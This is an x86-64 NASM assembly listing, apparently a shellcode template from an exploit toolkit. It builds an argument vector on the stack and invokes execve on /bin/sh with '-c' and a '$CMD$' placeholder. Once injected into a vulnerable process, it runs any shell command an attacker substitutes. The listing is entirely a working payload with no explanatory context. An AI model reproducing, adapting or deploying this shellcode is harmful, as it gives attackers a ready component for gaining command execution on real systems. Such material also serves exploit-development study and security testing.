; execve("/bin//sh", ["sh", "-c" "$CMD$"], [NULL]), contains nulls, 45+cmdlen bytes
BITS 64
xor rax, rax
lea rdi, [rel bin]

push rax                ; NULL
push rsp
pop rdx                 ; envp -> [NULL]

lea rcx, [rdi+11]
push rcx                ; "$CMD$"
lea rcx, [rdi+8]
push rcx                ; "-c"
lea rcx, [rdi+5]
push rcx                ; "sh"
push rsp
pop rsi                 ; argv -> ["sh", "-c", "$CMD$", NULL]

mov al, 59              ; __NR_execve
syscall

bin: db "/bin/sh", 0
arg1: db "-c", 0
cmd: db "$CMD$", 0
